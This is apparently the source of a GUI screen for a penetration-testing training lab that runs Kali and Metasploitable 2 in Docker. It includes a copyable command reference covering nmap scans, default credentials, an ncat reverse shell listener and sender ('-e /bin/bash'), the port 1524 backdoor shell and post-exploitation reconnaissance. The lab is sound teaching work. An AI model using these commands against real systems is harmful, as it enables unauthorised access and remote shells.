import customtkinter as ctk
import subprocess
import threading
from config import KALI_CONTAINER, META_CONTAINER, KALI_IMAGE, METASPLOITABLE_IMAGE, DOCKER_NETWORK

C = {
    "primary":     "#4f46e5",
    "primary_hov": "#4338ca",
    "card":        ("gray92", "#1e293b"),
    "muted":       ("gray40", "#94a3b8"),
    "success":     "#10b981",
    "error":       "#ef4444",
    "stopped":     ("gray60", "#64748b"),
    "divider":     ("gray80", "#334155"),
    "copy_ok":     "#10b981",
}

CONTENEDORES = [
    (KALI_CONTAINER,  KALI_IMAGE,           "Kali Linux",       "Distribución ofensiva para pentesting y auditorías"),
    (META_CONTAINER,  METASPLOITABLE_IMAGE,  "Metasploitable 2", "Máquina intencionalmente vulnerable para práctica"),
]

# ── Banners de terminal ───────────────────────────────────────────────
# Kali:          banner ya integrado en /etc/motd del Dockerfile
# Metasploitable: se inyecta en /tmp/octolab_motd vía stdin al abrir terminal
_BANNER_META = (
    "    __  ___     __                   __      _ __        __    __    ___ \n"
    "   /  |/  /__  / /_____ __________  / /___  (_) /_____ _/ /_  / /__ |__ \\\n"
    "  / /|_/ / _ \\/ __/ __ `/ ___/ __ \\/ / __ \\/ / __/ __ `/ __ \\/ / _ \\__/ /\n"
    " / /  / /  __/ /_/ /_/ (__  ) /_/ / / /_/ / / /_/ /_/ / /_/ / /  __/ __/ \n"
    "/_/  /_/\\___/\\__/\\__,_/____/ .___/_/\\____/_/\\__/\\__,_/_.___/_/\\___/____/ \n"
    "                          /_/\n"
    "\n"
    "  Contenedor  : octolab-metasploitable\n"
    "  Red         : octolab-net\n"
    "  Credenciales: msfadmin / msfadmin  |  root / toor\n"
    "\n"
    "  Warning: Never expose this VM to an untrusted network!\n"
    "\n"
)

BANNERS: dict[str, str] = {
    META_CONTAINER: _BANNER_META,
}

# ── Referencia de comandos ────────────────────────────────────────────
# Herramientas disponibles en octolab-kali: nmap, ncat, curl, wget,
# python3, ssh, ping, net-tools, dnsutils
COMANDOS = {
    ("RE", "#0891b2", "Reconocimiento — nmap"): [
        ("Descubrir hosts activos en la red",     "nmap -sn -T4 -n 172.18.0.0/16"),
        ("Escaneo rápido (100 puertos comunes)",  "nmap -T4 -n -F <IP_objetivo>"),
        ("Escaneo de puertos y versiones",        "nmap -sS -sV -T4 -n -p 1-1000 <IP_objetivo>"),
        ("Escaneo completo (todos los puertos)",  "nmap -sS -T4 -n -p- --min-rate 5000 <IP_objetivo>"),
        ("Scripts NSE de un servicio concreto",   "nmap -T4 -n -p 21 --script ftp* <IP_objetivo>"),
        ("Scripts NSE HTTP",                      "nmap -T4 -n -p 80 --script http-* <IP_objetivo>"),
    ],
    ("CN", "#0891b2", "Conexiones y Banners — ncat"): [
        ("Capturar banner de cualquier servicio", "ncat <IP_objetivo> <puerto>"),
        ("Conectar a FTP  (prueba anonymous)",    "ncat <IP_objetivo> 21"),
        ("Conectar a Telnet",                     "ncat <IP_objetivo> 23"),
        ("Conectar a IRC  (puerto 6667)",         "ncat <IP_objetivo> 6667"),
        ("Escucha para recibir reverse shell",    "ncat -lvp 4444"),
        ("Enviar reverse shell al oyente",        "ncat <IP_kali> 4444 -e /bin/bash"),
    ],
    ("WB", "#7c3aed", "Web — curl"): [
        ("Cabeceras HTTP del servidor",           "curl -I http://<IP_objetivo>/"),
        ("Página principal",                      "curl http://<IP_objetivo>/"),
        ("DVWA (app vulnerable incluida)",        "curl http://<IP_objetivo>/dvwa/"),
        ("Mutillidae (app vulnerable incluida)",  "curl http://<IP_objetivo>/mutillidae/"),
        ("Tomcat manager  (puerto 8180)",         "curl http://<IP_objetivo>:8180/manager/html"),
        ("phpMyAdmin",                            "curl http://<IP_objetivo>/phpmyadmin/"),
    ],
    ("SS", "#059669", "SSH — credenciales por defecto"): [
        ("Conectar como msfadmin",                "ssh msfadmin@<IP_objetivo>"),
        ("Conectar como root",                    "ssh root@<IP_objetivo>"),
        ("Deshabilitar comprobación de clave",    "ssh -o StrictHostKeyChecking=no msfadmin@<IP_objetivo>"),
        ("Comprobar versión SSH",                 "nmap -T4 -n -p 22 -sV <IP_objetivo>"),
    ],
    ("PE", "#dc2626", "Post-explotación"): [
        ("Ver usuario actual",                    "whoami"),
        ("Ver UID / GID",                         "id"),
        ("Información del sistema operativo",     "uname -a"),
        ("Shell TTY interactiva con python3",     "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"),
        ("Ver usuarios del sistema",              "cat /etc/passwd"),
        ("Binarios SUID  (posible escalada)",     "find / -perm -4000 2>/dev/null"),
        ("Interfaces de red",                     "ip a"),
        ("Conexiones activas",                    "ss -antp"),
    ],
    ("RD", "#4f46e5", "Red interna"): [
        ("Verificar conectividad",                "ping -c 4 <IP_objetivo>"),
        ("Ver IP de Kali en la red",              "ip a | grep 172"),
        ("Resolución DNS inversa",                "nslookup <IP_objetivo>"),
        ("IP de Metasploitable  (host Windows)",
         f"docker inspect -f '{{{{.NetworkSettings.Networks.{DOCKER_NETWORK}.IPAddress}}}}' {META_CONTAINER}"),
        ("IP de Kali  (host Windows)",
         f"docker inspect -f '{{{{.NetworkSettings.Networks.{DOCKER_NETWORK}.IPAddress}}}}' {KALI_CONTAINER}"),
    ],
    ("M2", "#dc2626", "Metasploitable 2 — Servicios y backdoors"): [
        ("Escanear todos los servicios conocidos",   "nmap -sS -sV -T4 -n -p 21,22,23,25,80,139,445,1524,3306,5432,5900,6667,8180 <IP_meta>"),
        ("Ingreslock — shell root directa (1524)",   "ncat <IP_meta> 1524"),
        ("FTP — login anónimo",                      "ncat <IP_meta> 21"),
        ("Telnet — acceso interactivo",              "ncat <IP_meta> 23"),
        ("IRC — UnrealIRCd (puerto 6667)",           "ncat <IP_meta> 6667"),
        ("Distcc — verificar exposición (3632)",     "nmap -T4 -n -p 3632 -sV <IP_meta>"),
    ],
    ("MW", "#7c3aed", "Metasploitable 2 — Aplicaciones web"): [
        ("Listar títulos de servicios HTTP",         "nmap -T4 -n -p 80,8180,8080 --script http-title <IP_meta>"),
        ("Tomcat manager (tomcat:tomcat)",            "curl -u tomcat:tomcat http://<IP_meta>:8180/manager/html"),
        ("DVWA — formulario de login",               "curl http://<IP_meta>/dvwa/login.php"),
        ("Mutillidae",                               "curl http://<IP_meta>/mutillidae/"),
        ("phpMyAdmin (root sin contraseña)",          "curl http://<IP_meta>/phpmyadmin/"),
        ("MySQL — verificar acceso remoto",          "nmap -T4 -n -p 3306 -sV <IP_meta>"),
    ],
}


# ── Botón icono ───────────────────────────────────────────────────────
def _icon_btn(parent, icon: str, label: str,
              fg, hover, command, enabled: bool = True) -> ctk.CTkFrame:
    frame = ctk.CTkFrame(parent, fg_color="transparent")
    btn = ctk.CTkButton(
        frame, text=icon,
        width=48, height=44, corner_radius=10,
        fg_color=fg, hover_color=hover,
        font=ctk.CTkFont(size=17),
        state="normal" if enabled else "disabled",
        command=command,
    )
    btn.pack()
    ctk.CTkLabel(frame, text=label,
                 font=ctk.CTkFont(size=10),
                 text_color=C["muted"]).pack(pady=(3, 0))
    frame._btn = btn
    return frame


# ── Pantalla ──────────────────────────────────────────────────────────
class LabsScreen(ctk.CTkFrame):
    def __init__(self, master, docker_manager):
        super().__init__(master, fg_color="transparent")
        self.docker        = docker_manager
        self.estado_labels = {}
        self.ip_labels     = {}
        self._start_frames = {}
        self._term_frames  = {}
        self._stop_frames  = {}
        self._build()
        threading.Thread(target=self._refrescar_estados, daemon=True).start()

    # ── Construcción ─────────────────────────────────────────────────
    def _build(self):
        # Título fuera del scroll (cabecera fija)
        ctk.CTkLabel(self, text="Laboratorios",
                     font=ctk.CTkFont(size=22, weight="bold")).pack(
                         anchor="w", padx=40, pady=(28, 2))
        ctk.CTkLabel(self,
                     text="Los contenedores comparten la red interna octolab-net — "
                          "Kali puede escanear y explotar Metasploitable directamente.",
                     text_color=C["muted"],
                     font=ctk.CTkFont(size=12),
                     wraplength=660, justify="left").pack(anchor="w", padx=40, pady=(0, 16))

        ctk.CTkFrame(self, height=1, fg_color=C["divider"]).pack(fill="x", padx=40, pady=(0, 12))

        # Todo lo demás desplazable
        scroll = ctk.CTkScrollableFrame(self, fg_color="transparent")
        scroll.pack(fill="both", expand=True)

        # ── Tarjetas de contenedores ──────────────────────────────────
        for nombre, imagen, titulo, desc in CONTENEDORES:
            card = ctk.CTkFrame(scroll, corner_radius=12, fg_color=C["card"])
            card.pack(fill="x", padx=40, pady=6)

            top = ctk.CTkFrame(card, fg_color="transparent")
            top.pack(fill="x", padx=20, pady=(14, 4))
            ctk.CTkLabel(top, text=titulo,
                         font=ctk.CTkFont(size=15, weight="bold")).pack(side="left")
            estado_lbl = ctk.CTkLabel(top, text="Detenido",
                                       text_color=C["stopped"],
                                       font=ctk.CTkFont(size=12, weight="bold"))
            estado_lbl.pack(side="right")
            self.estado_labels[nombre] = estado_lbl

            ctk.CTkLabel(card, text=desc,
                         text_color=C["muted"],
                         font=ctk.CTkFont(size=12)).pack(anchor="w", padx=20)

            ip_lbl = ctk.CTkLabel(card, text="",
                                   text_color=C["primary"],
                                   font=ctk.CTkFont(family="Courier New", size=11))
            ip_lbl.pack(anchor="w", padx=20, pady=(2, 0))
            self.ip_labels[nombre] = ip_lbl

            btns_row = ctk.CTkFrame(card, fg_color="transparent")
            btns_row.pack(anchor="w", padx=20, pady=(12, 16))

            start_f = _icon_btn(btns_row, "▶", "Iniciar",
                                 C["primary"], C["primary_hov"],
                                 lambda n=nombre, img=imagen: self._iniciar(n, img))
            start_f.pack(side="left", padx=(0, 10))
            self._start_frames[nombre] = start_f

            term_f = _icon_btn(btns_row, ">_", "Terminal",
                                ("#1e3a5f", "#1e3a5f"), "#1e4a7f",
                                lambda n=nombre: self._abrir_terminal(n),
                                enabled=False)
            term_f.pack(side="left", padx=(0, 10))
            self._term_frames[nombre] = term_f

            stop_f = _icon_btn(btns_row, "■", "Detener",
                                "#ef4444", "#dc2626",
                                lambda n=nombre: self._detener(n),
                                enabled=False)
            stop_f.pack(side="left")
            self._stop_frames[nombre] = stop_f

        # ── Referencia de comandos ────────────────────────────────────
        ctk.CTkFrame(scroll, height=1, fg_color=C["divider"]).pack(
            fill="x", padx=40, pady=(20, 16))

        ctk.CTkLabel(scroll, text="Referencia de comandos",
                     font=ctk.CTkFont(size=15, weight="bold")).pack(
                         anchor="w", padx=40, pady=(0, 12))

        ctk.CTkLabel(scroll,
                     text="Comandos de uso frecuente en los laboratorios. "
                          "Haz clic en Copiar para llevarlos directamente a la terminal.",
                     text_color=C["muted"],
                     font=ctk.CTkFont(size=11),
                     wraplength=660, justify="left").pack(anchor="w", padx=40, pady=(0, 14))

        for (abrev, color, categoria), cmds in COMANDOS.items():
            self._seccion_comandos(scroll, abrev, color, categoria, cmds)

        # Margen inferior
        ctk.CTkFrame(scroll, height=20, fg_color="transparent").pack()

    def _seccion_comandos(self, parent, abrev: str, color: str,
                          titulo: str, cmds: list):
        """Renderiza una categoría de comandos con su tarjeta."""
        # Cabecera de categoría
        hdr = ctk.CTkFrame(parent, fg_color="transparent")
        hdr.pack(fill="x", padx=40, pady=(0, 6))

        bdg = ctk.CTkFrame(hdr, width=32, height=22,
                           corner_radius=5, fg_color=color)
        bdg.pack(side="left")
        bdg.pack_propagate(False)
        ctk.CTkLabel(bdg, text=abrev,
                     font=ctk.CTkFont(size=9, weight="bold"),
                     text_color="white").place(relx=0.5, rely=0.5, anchor="center")

        ctk.CTkLabel(hdr, text=titulo,
                     font=ctk.CTkFont(size=12, weight="bold")).pack(
                         side="left", padx=(8, 0))

        # Tarjeta con filas de comandos
        card = ctk.CTkFrame(parent, corner_radius=10, fg_color=C["card"])
        card.pack(fill="x", padx=40, pady=(0, 14))

        for j, (desc, cmd) in enumerate(cmds):
            if j > 0:
                ctk.CTkFrame(card, height=1, fg_color=C["divider"]).pack(
                    fill="x", padx=14)

            row = ctk.CTkFrame(card, fg_color="transparent")
            row.pack(fill="x", padx=14, pady=7)

            # Descripción
            ctk.CTkLabel(row, text=desc,
                         text_color=C["muted"],
                         font=ctk.CTkFont(size=11),
                         width=240, anchor="w").pack(side="left")

            # Comando en monospace
            ctk.CTkLabel(row, text=cmd,
                         font=ctk.CTkFont(family="Courier New", size=11),
                         anchor="w").pack(side="left", fill="x", expand=True, padx=(8, 8))

            # Botón copiar
            copy_btn = ctk.CTkButton(
                row, text="Copiar",
                width=64, height=26,
                corner_radius=6,
                fg_color=("gray78", "#334155"),
                hover_color=("gray68", "#475569"),
                font=ctk.CTkFont(size=10),
            )
            copy_btn.configure(
                command=lambda c=cmd, b=copy_btn: self._copiar(c, b))
            copy_btn.pack(side="right")

    # ── Estado de contenedores ────────────────────────────────────────
    def _refrescar_estados(self):
        for nombre, _, _, _ in CONTENEDORES:
            try:
                estado = self.docker.estado_contenedor(nombre)
                ip     = self.docker.get_ip_contenedor(nombre) if estado == "running" else None
                self.after(0, lambda n=nombre, e=estado, i=ip: self._set_estado(n, e, i))
            except Exception:
                pass

    def _set_estado(self, nombre: str, estado: str, ip: str | None = None):
        lbl     = self.estado_labels.get(nombre)
        ip_lbl  = self.ip_labels.get(nombre)
        running = estado == "running"

        if lbl:
            if running:
                lbl.configure(text="En ejecucion", text_color=C["success"])
            elif estado == "error":
                lbl.configure(text="Error",        text_color=C["error"])
            else:
                lbl.configure(text="Detenido",     text_color=C["stopped"])

        if ip_lbl:
            ip_lbl.configure(text=f"IP red interna: {ip}" if ip else "")

        # En error: solo Iniciar activo (para reintentar)
        self._set_btn_enabled(self._start_frames.get(nombre), not running)
        self._set_btn_enabled(self._term_frames.get(nombre),  running)
        self._set_btn_enabled(self._stop_frames.get(nombre),  running)

    @staticmethod
    def _set_btn_enabled(frame, enabled: bool):
        if frame and hasattr(frame, "_btn"):
            frame._btn.configure(state="normal" if enabled else "disabled")

    # ── Acciones ─────────────────────────────────────────────────────
    def _iniciar(self, nombre: str, imagen: str):
        def on_status(msg: str):
            # Muestra el mensaje de progreso en la etiqueta de estado (hilo secundario → after)
            self.after(0, lambda m=msg: self.estado_labels[nombre].configure(
                text=m[:52] + "…" if len(msg) > 52 else m,
                text_color=C["muted"]))

        def tarea():
            self.after(0, lambda: self.estado_labels[nombre].configure(
                text="Iniciando...", text_color=C["muted"]))
            self.after(0, lambda: [
                self._set_btn_enabled(self._start_frames.get(nombre), False),
                self._set_btn_enabled(self._term_frames.get(nombre),  False),
                self._set_btn_enabled(self._stop_frames.get(nombre),  False),
            ])
            ok = self.docker.lanzar_contenedor(nombre, imagen, on_status=on_status)
            ip = self.docker.get_ip_contenedor(nombre) if ok else None
            self.after(0, lambda: self._set_estado(nombre, "running" if ok else "error", ip))
        threading.Thread(target=tarea, daemon=True).start()

    def _detener(self, nombre: str):
        def tarea():
            try:
                if self.docker.client:
                    self.docker.client.containers.get(nombre).stop()
                self.after(0, lambda: self._set_estado(nombre, "stopped"))
            except Exception:
                pass
        threading.Thread(target=tarea, daemon=True).start()

    def _abrir_terminal(self, nombre: str):
        try:
            banner = BANNERS.get(nombre)
            if banner:
                # Inyectar banner en /tmp/octolab_motd vía stdin — sin quoting ni escaping
                subprocess.run(
                    ["docker", "exec", "-i", nombre, "bash", "-c",
                     "cat > /tmp/octolab_motd"],
                    input=banner.encode("utf-8"),
                    capture_output=True,
                    timeout=5,
                )
                motd_cmd = "cat /tmp/octolab_motd 2>/dev/null; exec bash"
            else:
                # Kali: banner ya está en /etc/motd del Dockerfile
                motd_cmd = "cat /etc/motd 2>/dev/null; exec bash"

            # String directo a CreateProcess — cmd.exe maneja las comillas sin escaping roto
            cmd = f'cmd.exe /k docker exec -it {nombre} bash -c "{motd_cmd}"'
            subprocess.Popen(cmd, creationflags=subprocess.CREATE_NEW_CONSOLE)
        except Exception as e:
            print(f"Error abriendo terminal: {e}")

    def _copiar(self, cmd: str, btn: ctk.CTkButton):
        self.clipboard_clear()
        self.clipboard_append(cmd)
        self.update()
        btn.configure(text="✓", fg_color=C["copy_ok"], hover_color="#059669")
        self.after(1500, lambda: btn.configure(
            text="Copiar",
            fg_color=("gray78", "#334155"),
            hover_color=("gray68", "#475569"),
        ))
